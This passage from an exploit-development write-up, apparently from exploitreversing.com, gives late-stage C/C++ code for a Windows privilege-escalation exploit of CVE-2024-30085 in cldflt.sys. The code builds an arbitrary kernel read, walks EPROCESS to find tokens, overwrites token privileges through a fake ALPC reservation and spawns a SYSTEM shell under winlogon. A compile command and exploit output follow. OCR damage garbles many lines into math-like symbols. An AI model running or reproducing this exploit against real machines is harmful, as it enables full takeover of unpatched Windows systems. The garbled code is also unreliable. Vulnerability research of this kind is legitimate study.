\
}\
\
//=\
\
// STAGE 17: SETUP ARBITRARY READ\
\
//=\
\
static BOOL Stage17\_SetupArbitraryRead(void) { printf $( " ) \\setminus \\neg \\neg \\neg = \\neg = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap ^ { " } \\cup \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap $ printf(" STAGE 17: SETUP ARBITRARY READ\\n"); printf ${ \\bf \\Pi } ^ { " 1 } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\Pi ^ { " 1 } \\cup \\approx = = = = = = = = = = = = = = = = = \\left. \\Pi ^ { " 1 } \\right. .$ ; if (g\_victim\_index\_second $\\begin{array} { r l } { = { } } & { { } - 1 } \\end{array}$ \|\| g\_leaked\_kalpc $= =$ NULL) { printf("\[-\] Missing prerequisites\\n"); return FALSE; } memset(g\_fake\_pipe\_attr, 0, sizeof(g\_fake\_pipe\_attr)); memset(g\_fake\_pipe\_attr2, 0, sizeof(g\_fake\_pipe\_attr2)); ULONG64 $\\star$ fake1 $=$ (ULONG64\*)g\_fake\_pipe\_attr; fake1\[0\] $=$ (ULONG64)g\_fake\_pipe\_attr2; fake1\[1\] $=$ (ULONG64)g\_leaked\_pipe\_attr; fake1\[2\] $=$ (ULONG64)g\_fake\_attr\_name; fake1\[3\] = $\\Theta \\times 3 \\Theta$ ; fake1\[4\] $=$ (ULONG64)g\_leaked\_kalpc; fake1\[5\] $=$ 0x6969696969696969ULL; ULONG64 $\\star$ fake2 $=$ (ULONG64\*)g\_fake\_pipe\_attr2; fake2\[0\] $=$ $\\Theta \\times 7 \\odot 7 \\odot 7 \\odot 7 \\odot 7 \\odot 7 \\odot 7 \\odot 1 \\downarrow \\downarrow$ ; fake2\[1\] $=$ (ULONG64)g\_fake\_pipe\_attr; fake2\[2\] $=$ (ULONG64)g\_fake\_attr\_name2; fake2\[3\] = $\\Theta \\times 3 \\Theta$ ; fake2\[4\] $=$ (ULONG64)g\_leaked\_kalpc; fake2\[5\] $=$ 0x7171717171717171ULL; printf(" $\[ + \]$ Fake pipe\_attr at: 0x%p\\n", g\_fake\_pipe\_attr); auto overflow\_data $=$ std::make\_unique<BYTE\[\]>( $( 9 \\times F \\mathsf { F } 8 )$ ); memset(overflow\_data.get(), $\\Theta \\times 5 6$ , $\\Theta \\times \\mathsf { F } \\mathsf { F } \\otimes \\mathsf { \\Sigma }$ ); ); if (status ! $=$ 0) { printf("\[-\] WNF update failed: $\\Theta \\times \_ { \\prime 0 } ^ { 0 \\prime } \\Theta \\Theta \\mathsf { X }$ \\n", status); return FALSE; } printf("\[+\] pipe\_attribute->Flink corrupted\\n"); printf("\[+\] Stage 17 COMPLETE\\n"); return TRUE;\
\
}\
\
//==\
\
// STAGE 18: READ KERNEL MEMORY\
\
//==========\
\
static BOOL Stage18\_ReadKernelMemory(void) { printf("\\n== ===\\n"); printf(" STAGE 18: READ KERNEL MEMORY\\n"); printf("====== ${ \\binom { 1 1 } { 1 } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = $ ========\\n"); g\_target\_pipe\_index $\\begin{array} { r l } { \\mathbf { \\Sigma } } & { { } = \\mathbf { \\Sigma } - \\mathbf { \\Sigma } \\mathbf { \] } } \\end{array}$ ; BYTE buffer $\\left\[ \\Theta \\times \\mathtt { l } \\odot \\odot \\right\] \\cdot$ \] = { 0 }; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ PIPE\_SPRAY\_COUNT; i++) { if (g\_pipe\_write\[i\] $= =$ NULL) continue; IO\_STATUS\_BLOCK iosb $= { }$ ; NTSTATUS status $=$ g\_NtFsControlFile(g\_pipe\_write\[i\], NULL, NULL, NULL, &iosb, FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE, g\_fake\_attr\_name,

(ULONG)strlen(g\_fake\_attr\_name) $^ + 1$ , buffer, sizeof(buffer)); if (status $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { ULONG64\* data $=$ (ULONG64\*)buffer; if (!IsKernelPointer(data\[0\]) \|\| !IsKernelPointer(data\[1\]) \|\|

!IsKernelPointer(data\[3\])) { printf("\[-\] Pipe %lu: invalid KALPC\_RESERVE pointers, skipping\\n", i); continue; } g\_target\_pipe\_index $= \\dot { ~ } \\dot { 7 }$ ; printf("\[+\] Found target pipe at index %lu\\n", i); printf("\[\*\] KALPC\_RESERVE:\\n"); for (int j $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; j < 4; ${ \\dot { \] } } + +$ ) { printf(" $+ \\odot \\times \_ { ^ { \\circ } \\circ } ^ { 0 \\prime } \\odot 2 \\times$ : 0x%016llX\\n", j $\\qquad \\star \\quad 8$ , (unsigned long long)data\[j\]) } g\_alpc\_port\_addr $=$ data\[0\]; g\_alpc\_handle\_table\_addr $=$ data\[1\]; g\_alpc\_message\_addr $=$ data\[3\]; break; } } if (g\_target\_pipe\_index $\\begin{array} { r l } { = { } } & { { } - 1 } \\end{array}$ ) { printf("\[-\] Failed to read kernel memory via any pipe\\n"); return FALSE; } printf("\[+\] Arbitrary READ primitive established!\\n"); printf("\[+\] Stage 18 COMPLETE\\n"); return TRUE;

}

//=

// STAGE 19: DISCOVER EPROCESS AND TOKEN

//==

static BOOL Stage19\_DiscoverEprocessAndToken(void) { printf("\\n= =\\n"); printf(" STAGE 19: DISCOVER EPROCESS/TOKEN\\n"); printf("= ==\\n"); printf("\[+\] ALPC\_PORT: 0x%016llX\\n", (unsigned long long)g\_alpc\_port\_addr); BYTE alpc\_port\_data $\\odot \\times 2 0 \\odot \\cdot$ \]; if (!ReadKernelBuffer(g\_alpc\_port\_addr, alpc\_port\_data, sizeof(alpc\_port\_data))) { printf("\[-\] Failed to read ALPC\_PORT\\n"); return FALSE; } g\_eprocess\_addr $=$ \*(ULONG64\*)(alpc\_port\_data $^ +$ $\\Theta \\times \\bot 8$ ); if (!IsKernelPointer(g\_eprocess\_addr)) { for (int offset $=$ $\\Theta \\times \\bot \\Theta$ ; offset $< =$ $\\Theta \\times 3 8$ ; offset $+ = 8$ ) { ULONG64 candidate $= ~ \\star$ (ULONG64\*)(alpc\_port\_data $^ +$ offset); if (!IsKernelPointer(candidate)) continue; char test\_name\[16\] $= \\begin{array} { c c c } { \\left{ \\begin{array} { l } { \\begin{array} { r l } \\end{array} } \\end{array} \\right} } \\end{array}$ ; if (ReadKernelBuffer(candidate $^ +$ EPROCESS\_IMAGEFILENAME\_OFFSET, test\_name,

15)) { BOOL valid $=$ TRUE; for (int j $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; j < 15 && test\_name\[j\]; j++) { if (test\_name\[j\] $\\textless$ 32 \|\| test\_name\[j\] $> =$ 127) { valid $=$ FALSE;

break; } } if (valid && test\_name\[0\]) { g\_eprocess\_addr $=$ candidate; printf("\[+\] EPROCESS: 0x%016llX (%s)\\n", (unsigned long

long)candidate, test\_name); break; } } } } else { char name\[16\] = { 0 }; ReadKernelBuffer(g\_eprocess\_addr $^ +$ EPROCESS\_IMAGEFILENAME\_OFFSET, name, 15); printf("\[+\] EPROCESS: $\\Theta \\times % 0 0$ 16llX (%s)\\n", (unsigned long long)g\_eprocess\_addr,

name); } if (!IsKernelPointer(g\_eprocess\_addr)) { printf("\[-\] Could not find EPROCESS\\n"); return FALSE;

}

DWORD our\_pid $=$ GetCurrentProcessId();

printf("\[\*\] Our PID: %lu\\n", our\_pid);

ULONG64 current $=$ g\_eprocess\_addr;

ULONG64 start $=$ g\_eprocess\_addr;

int count $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;

do { BYTE chunk $\\left\[ \\odot \\times \\perp 8 \\odot \\right\]$ ; if (!ReadKernelBuffer(current $^ +$ $\\Theta \\times 4 4 \\Theta$ , chunk, sizeof(chunk))) break; ULONG pid $=$ $= \\star ( \\mathsf { U L O N G } \\star )$ )(chunk + 0); ULONG64 flink $= ~ \\star$ (ULONG64\*)(chunk + 8); ULONG64 token\_raw $=$ \*(ULONG64\*)(chunk $^ +$ $\\Theta \\times 7 8$ ); char name\[16\] $=$ { 0 }; memcpy(name, chunk $^ +$ $\\Theta \\times 1 6 8$ , 15); ULONG64 token $=$ token\_raw & $\\sim \\odot \\times$ FULL; if (pid $= = 4$ ) { g\_system\_eprocess $=$ current; g\_system\_token $=$ token; printf("\[+\] SYSTEM EPROCESS: 0x%016llX\\n", (unsigned long long)current); printf(" $\[ + \]$ SYSTEM Token: $\\Theta \\times % 0 0$ 16llX\\n", (unsigned long long)token); } if (pid $= =$ our\_pid) { g\_our\_eprocess $=$ current; g\_our\_token $=$ token; printf("\[+\] Our EPROCESS: 0x%016llX\\n", (unsigned long long)current); printf("\[+\] Our Token: $\\Theta \\times \_ { \\prime 0 } ^ { 0 \\prime } \\Theta \_ { - }$ 16llX\\n", (unsigned long long)token); } if (\_stricmp(name, "winlogon. $\\in \\times \\in ^ { 1 1 }$ ) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { g\_winlogon\_pid $=$ pid; printf("\[+\] Winlogon PID: %lu\\n", pid); } if (g\_system\_eprocess && g\_our\_eprocess && g\_winlogon\_pid) break; if (!IsKernelPointer(flink)) break; current $=$ flink - EPROCESS\_ACTIVEPROCESSLINKS\_OFFSET; if (current $= =$ start) break; count++;

} while (count < 500);

if (!g\_system\_eprocess \|\| !g\_our\_eprocess) { printf("\[-\] Failed to find required processes\\n"); return FALSE;

}

if (!IsKernelPointer(g\_system\_token) \|\| !IsKernelPointer(g\_our\_token)) { printf("\[-\] Token values don't look valid\\n");

printf(" System token raw: $\\Theta \\times % 0 0$ 16llX\\n", (unsigned long long)g\_system\_token); printf(" Our token raw: $\\Theta \\times % 0 0$ 16llX\\n", (unsigned long long)g\_our\_token); return FALSE; } }

|     |     |     |
| --- | --- | --- |
|  | if (g\_winlogon\_pid == 0) { printf("\[-\] Warning: winlogon.exe not found during walk\\n"); |  |
| } printf("\[+\] Stage 19 COMPLETE\\n"); |  |  |
| return TRUE; |  |  |
|  |  |  |
| STAGE 20: ALPC ARBITRARY WRITE |  |  |
|  | atic BOoL Stage20\_AlpcArbitraryWrite(void) { |  |
| printf("\\n= |  | ==\\n"); |
| printf(" printf("== | STAGE 20: ALPC ARBITRARY WRITE\\n"); | ==\\n"); |
|  |  |  |
| if (g\_victim\_index == -1 \|\| |  | g\_our\_token == 0 \|l g\_alpc\_handle\_table\_addr == 0) { |
|  |  | printf("\[-\] Missing prerequisites for ALPC write\\n"); |
| return FALSE; |  |  |
| } |  |  |
|  |  | printf("\[\*\] Setting up fake KALPC structures... \\n"); |
|  |  |  |
|  | static KALPC\_RESERVE fakeKalpcReserve; |  |
|  | static KALPC\_MESSAGE fakeKalpcMessage; |  |
|  | memset(&fakeKalpcReserve, 0, sizeof(KALPC\_RESERVE)); |  |
|  | memset(&fakeKalpcMessage, 0, sizeof(KALPC\_MESSAGE)); |  |
|  |  | fakeKalpcReserve.OwnerPort = (PvoID)g\_alpc\_port\_addr; |
|  |  | fakeKalpcReserve.HandleTable = (PvoID)g\_alpc\_handle\_table\_addr; |
|  | fakeKalpcReserve.Handle = g\_saved\_reserve\_handle; |  |
| fakeKalpcReserve.Size = 0x30; | fakeKalpcReserve.Message = &fakeKalpcMessage; |  |
| fakeKalpcReserve.Active = 1; |  |  |
|  |  |  |
|  | fakeKalpcMessage.Reserve = &fakeKalpcReserve; |  |
|  | fakeKalpcMessage.ExtensionBuffer = (PVoID)(g\_our\_token + 0x40); // Token |  |
|  | ivileges (according to \_TokEN structure from Virgilius Project) |  |
|  | fakeKalpcMessage.ExtensionBufferSize = 0x10; |  |
|  |  | printf("\[+\] Fake KALPC\_RESERVE: 0x%p\\n", &fakeKalpcReserve); |
|  |  |  |
|  | printf("\[+\] Fake KALPC\_MESSAGE: 0x%p\\n", &fakeKalpcMessage); |  |
| 40)); | printf("\[+\] Target (Token+0x40): 0x%016llX\\n", (unsigned long long)(g\_our\_token + |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  | ULONG64 leaked\_reserve\_addr = (ULONG64)g\_leaked\_kalpc; |  |
|  |  |  |
|  |  | printf("\[\*\] Leaked KALPC\_RESERVE from Stage 8: 0x%016llX\\n", leaked\_reserve\_addr); |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  | printf("\[\*\] This was at offset OxFF0 from wNF overflow\\n"); |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  |  |

printf("\[\*\] Corrupting via first WNF overflow...\\n"); auto overflow\_data $=$ std::make\_unique<BYTE\[\] $>$ ( $\\Theta \\times \\mathsf { F } \\mathsf { F } \\otimes ,$ ); memset(overflow\_data.get(), $\\Theta \\times 5 7$ , $\\Theta \\times \\mathsf { F } \\mathsf { F } \\otimes \\mathsf { , }$ ); \*(ULONG64\*)(overflow\_data.get() $^ +$ $\\Theta \\times \\mathsf { F } \\mathsf { F } \\odot$ ) $=$ (ULONG64)&fakeKalpcReserve; NTSTATUS status $=$ g\_NtUpdateWnfStateData( &g\_wnf\_names\[g\_victim\_index\], overflow\_data.get(), $\\Theta \\times \\mathsf { F } \\mathsf { F } 8$ , NULL, NULL, CHANGE\_STAMP\_FIRST, 0 ); if (status ! $=$ 0) { printf("\[-\] WNF update failed: 0x%08X\\n", status); return FALSE; } printf("\[+\] First WNF overflow complete - Handles array entry corrupted\\n"); printf("\[\*\] Sending ALPC messages...\\n"); ALPC\_MESSAGE alpc\_message; memset(&alpc\_message, 0, sizeof(alpc\_message)); alpc\_message.PortHeader.u1.s1.DataLength $\\begin{array} { r l } { = } & { { } \\odot \\times \\perp \\odot } \\end{array}$ ; alpc\_message.PortHeader.u1.s1.TotalLength $=$ sizeof(PORT\_MESSAGE) $^ +$ $\\Theta \\times \\bot \\Theta$ ; alpc\_message.PortHeader.MessageId $=$ (ULONG)(ULONG\_PTR)g\_saved\_reserve\_handle; ULONG\_PTR $\\star$ pData $=$ (ULONG\_PTR\*)alpc\_message.Data; pData\[0\] $=$ $\\Theta \\times$ FFFFFFFFFFFFFFFF; // Privileges.Present pData\[1\] $=$ $\\Theta \\times$ FFFFFFFFFFFFFFFF; // Privileges.Enabled for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ ALPC\_PORT\_COUNT; i++) { if (g\_alpc\_ports\[i\] $= =$ NULL) continue; g\_NtAlpcSendWaitReceivePort(g\_alpc\_ports\[i\], 0, (PPORT\_MESSAGE)&alpc\_message, NULL, NULL, NULL, NULL, NULL); } printf("\[+\] ALPC messages sent\\n"); Sleep(100); printf("\[\*\] Testing privilege elevation...\\n"); if (g\_winlogon\_pid $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\Theta } \\right.$ ) { printf("\[-\] Winlogon PID not available for verification\\n"); } else { OBJECT\_ATTRIBUTES oa $= { }$ ; oa.Length $=$ sizeof(OBJECT\_ATTRIBUTES); CLIENT\_ID cid $= { }$ ; cid.UniqueProcess $=$ (HANDLE)(ULONG\_PTR)g\_winlogon\_pid; HANDLE hTest $=$ NULL;

[https://exploitreversing.com](https://exploitreversing.com/) NTSTATUS test\_status $=$ g\_NtOpenProcess(&hTest,

PROCESS\_QUERY\_LIMITED\_INFORMATION, &oa, &cid); if (test\_status $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ && hTest ! $=$ NULL) { printf("\[+\] SUCCESS! Can open winlogon (PID %lu) - privileges elevated!\

g\_winlogon\_pid); CloseHandle(hTest); } else { printf("\[-\] Cannot open winlogon PID %lu (status $, = \\textcircled { \\cdot } \\times \_ { \\cdot 0 } ^ { 0 / 0 } \\textcircled { \\cdot } 8 \\times$ )\\n",

g\_winlogon\_pid, test\_status); printf("\[-\] ALPC write may have failed\\n"); } } printf("\[+\] Stage 20 COMPLETE\\n"); return TRUE;

}

//=

// STAGE 21: SPAWN SYSTEM SHELL

//==

static BOOL Stage21\_SpawnSystemShell(void) { printf $( " ) \\setminus \\neg \\neg \\neg = \\neg = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap ^ { " } \\cup \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap \\sqcap $ printf(" STAGE 21: SPAWN SYSTEM SHELL\\n"); printf("== ${ \\mathrm { ~ \ " ~ } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap \\mathrm { ~ \ " ~ }$ ; HANDLE hToken $=$ NULL; if (OpenProcessToken(GetCurrentProcess(), TOKEN\_ADJUST\_PRIVILEGES \| TOKEN\_QUERY,

&hToken)) { TOKEN\_PRIVILEGES token\_privileges $=$ {}; token\_privileges.PrivilegeCount $= ~ 1$ ; token\_privileges.Privileges\[0\].Attributes $=$ SE\_PRIVILEGE\_ENABLED; if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege",

&token\_privileges.Privileges\[0\].Luid)) { AdjustTokenPrivileges(hToken, FALSE, &token\_privileges, 0, NULL, NULL); printf("\[+\] Enabled SeDebugPrivilege\\n"); } CloseHandle(hToken); } if (g\_winlogon\_pid $\\begin{array} { r l } { \\mathbf { \\Sigma } = = } & { { } \\odot } \\end{array}$ ) { printf("\[-\] Winlogon PID not available\\n"); return FALSE; } printf("\[+\] Using winlogon PID: %lu\\n", g\_winlogon\_pid); OBJECT\_ATTRIBUTES objAttr $=$ {}; CLIENT\_ID clientId $=$ {}; objAttr.Length $=$ sizeof(OBJECT\_ATTRIBUTES); clientId.UniqueProcess $=$ (HANDLE)(ULONG\_PTR)g\_winlogon\_pid; HANDLE hWinlogon $=$ NULL;

# [https://exploitreversing.com](https://exploitreversing.com/)

NTSTATUS status $=$ g\_NtOpenProcess(&hWinlogon, PROCESS\_CREATE\_PROCESS, &objAttr,

&clientId); if (status ! $=$ 0 \|\| !hWinlogon) { printf("\[-\] Failed to open winlogon: 0x%08X\\n", status); return FALSE; } printf(" $\[ + \]$ Opened winlogon: 0x%p\\n", hWinlogon); STARTUPINFOEXW siex $=$ {}; PROCESS\_INFORMATION pi $=$ {}; SIZE\_T attrSize $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; siex.StartupInfo.cb $=$ sizeof(STARTUPINFOEXW); InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize); siex.lpAttributeList $=$ (LPPROC\_THREAD\_ATTRIBUTE\_LIST)malloc(attrSize); if (!siex.lpAttributeList) { CloseHandle(hWinlogon); return FALSE; } if (!InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize) \|\| !UpdateProcThreadAttribute(siex.lpAttributeList, 0,

PROC\_THREAD\_ATTRIBUTE\_PARENT\_PROCESS, &hWinlogon, sizeof(HANDLE), NULL, NULL)) { free(siex.lpAttributeList); CloseHandle(hWinlogon); return FALSE; } WCHAR cmdLine\[\] $=$ L"C:\\Windows\\System32\\cmd.exe"; BOOL result $=$ CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE\_NEW\_CONSOLE \| EXTENDED\_STARTUPINFO\_PRESENT, NULL, NULL, &siex.StartupInfo, &pi); DeleteProcThreadAttributeList(siex.lpAttributeList); free(siex.lpAttributeList); CloseHandle(hWinlogon); if (!result) { printf("\[-\] CreateProcess failed: %lu\\n", GetLastError()); return FALSE; } printf("\\n\[+\] ==\\n"); printf("\[+\] SYSTEM SHELL SPAWNED!\\n"); printf("\[+\] PID: %lu\\n", pi.dwProcessId); printf("\[+\] ${ \\begin{array} { r l } { { \\big \| } } & { = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = { \\backslash \\uparrow } ^ { 1 1 } \ } \\end{array} }$ ; CloseHandle(pi.hProcess); CloseHandle(pi.hThread); printf("\[+\] Stage 21 COMPLETE\\n"); return TRUE;

//===

// CLEANUP

//==

static void Cleanup(void) { printf $( " ~ \\backslash ~ \\backslash \\neg = \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\rangle ~ ;$ printf(" CLEANUP\\n"); printf ${ \\mathrm { ~ ~ { \\bar { ~ } { ~ \\theta ~ } ~ } } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\end = \\end \\end \\end \\end \\end $

if (g\_pipe\_read && g\_pipe\_write) { for (DWORD i = 0; i < PIPE\_SPRAY\_COUNT; i++) { if ((int)i $= =$ g\_target\_pipe\_index) continue; if (g\_pipe\_read\[i\]) CloseHandle(g\_pipe\_read\[i\]); if (g\_pipe\_write\[i\]) CloseHandle(g\_pipe\_write\[i\]); }

} SetFileAttributesW(g\_filePath, FILE\_ATTRIBUTE\_NORMAL);

DeleteFileW(g\_filePath);

SetFileAttributesW(g\_filePath\_second, FILE\_ATTRIBUTE\_NORMAL);

DeleteFileW(g\_filePath\_second);

if (g\_syncRootPath\[0\]) CfUnregisterSyncRoot(g\_syncRootPath);

printf("\[+\] Cleanup complete\\n");

int wmain(void) {

printf(" CVE-2024-30085 Exploit\\n");

printf(" Privilege Escalation via cldflt.sys Heap-based Buffer Overflow\\n");

printf("= ");

if (!InitializeNtdllFunctions() \|\| !InitializeSyncRoot()) { printf("\[-\] Initialization failed\\n"); return -1;

}

BOOL success $=$ TRUE;

if (success) success $=$ Stage01\_Defragmentation();

if (success) success $=$ Stage02\_WnfSpray();

if (success) success $=$ Stage03\_CreateHoles();

if (success) success $=$ Stage04\_PlaceOverflow();

if (success) success $=$ Stage05\_AlpcPorts();

if (success) success $=$ Stage06\_TriggerOverflow();

if (success) success $=$ Stage07\_AlpcReserves();

if (success) success $=$ Stage08\_LeakKernelPointer();

if (!g\_leaked\_kalpc) { printf("\\n\[-\] FIRST WAVE FAILED - Try again\\n"); getchar(); Cleanup(); return -1;

}

printf $\\scriptstyle { \ " } \\setminus = =$ FIRST WAVE SUCCESS: Leaked 0x%p $= = = \\backslash n ^ { \\prime }$ ", g\_leaked\_kalpc);

if (success) success $=$ Stage09\_CreatePipes();

if (success) success $=$ Stage10\_SprayPipeAttributesClaim();

if (success) success $=$ Stage11\_SecondWnfSpray();

if (success) success $=$ Stage12\_CreateHolesSecond();

if (success) success $=$ Stage13\_PlaceSecondOverflow();

if (success) success $=$ Stage14\_TriggerSecondOverflow();

if (success) success $=$ Stage15\_FillWithPipeAttributes();

if (success) success $=$ Stage16\_FindSecondVictimAndLeakPipe();

if (success) success $=$ Stage17\_SetupArbitraryRead();

if (success) success $=$ Stage18\_ReadKernelMemory();

if (success) success $=$ Stage19\_DiscoverEprocessAndToken();

if (success) success $=$ Stage20\_AlpcArbitraryWrite();

if (success) success $=$ Stage21\_SpawnSystemShell();

printf("\\n=

\\n"); printf(" %s\\n", success ? "EXPLOIT SUCCESSFUL!" : "EXPLOIT INCOMPLETE");

printf(" ");

printf $( 1 1 ) \\setminus \[ \\star \]$ Press ENTER to cleanup and exit...\\n");

getchar();

Cleanup();

return success ? 0 : -1; }

# \[Figure 116\]: Exploit code \| ALPC Arbitrary Write Edition

The code has been produced on Visual Studio 2022. To compile on Visual Studio Code (VSC), execute:

cl /TP /Fe:EXPLOIT.exe exploit.c /link Cldapi.lib Ole32.lib Shell32.lib ntdll.lib Advapi32.lib

The respective exploit output is:

C:\\Users\\Administrator\\Desktop\\RESEARCH>EXPLOIT.exe CVE-2024-30085 Exploit Privilege Escalation via cldflt.sys Heap-based Buffer Overflow

$\[ \+ \]$ All ntdll functions resolved

$\[ \+ \]$ Sync root registered: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot STAGE 01: DEFRAGMENTATION

$\[ \+ \]$ Round 1: 5000/5000 pipes

$\[ \+ \]$ Round 2: 5000/5000 pipes

$\[ \+ \]$ Waiting for the memory to stabilize...

$\[ \+ \]$ Stage 01 COMPLETE STAGE 02: WNF SPRAY

$\[ \+ \]$ Created 20480 padding WNF names

$\[ \+ \]$ Created 2048 actual WNF names

$\[ \+ \]$ Updated 2048 actual WNF objects

$\[ \+ \]$ Waiting for the memory to stabilize...

$\[ \+ \]$ Stage 02 COMPLETE STAGE 03: CREATE HOLES

$\[ \+ \]$ Created 1024 holes

$\[ \+ \]$ Waiting for the memory to stabilize...

$\[ \+ \]$ Stage 03 COMPLETE STAGE 04: PLACE OVERFLOW BUFFER

$\[ \+ \]$ Reparse point set (ChangeStamp=0xC0DE)

$\[ \+ \]$ Stage 04 COMPLETE STAGE 05: ALPC PORTS

$\[ \+ \]$ Created 2000 ALPC ports

$\[ \+ \]$ Waiting for the memory to stabilize...

$\[ \+ \]$ Stage 05 COMPLETE STAGE 06: TRIGGER OVERFLOW

[https://exploitreversing.com](https://exploitreversing.com/)

$\[ \+ \]$ Overflow triggered (0x1010 bytes into 0x1000 buffer) $\[ + \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 06 COMPLETE

STAGE 07: ALPC RESERVES $\[ + \]$ Created 514000 total reserves $\[ + \]$ Saved reserve handle: 0x0000000080000010 $\[ + \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 07 COMPLETE

STAGE 08: LEAK KERNEL POINTER $\[ + \]$ Found victim WNF at index 1 (DataSize: 0xFF8) $\[ + \]$ KERNEL POINTER LEAKED: 0xFFFFBE0FD53CEBB0 $\[ + \]$ Stage 08 COMPLETE

$= = =$ FIRST WAVE SUCCESS: Leaked 0xFFFFBE0FD53CEBB0 $= = =$ $\[ + \]$ Created 1536 pipe pairs $\[ + \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 09 COMPLETE

STAGE 10: SPRAY PIPE ATTRS (CLAIM)

$\[ \+ \]$ Set 1536 pipe attributes $\[ + \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 10 COMPLETE

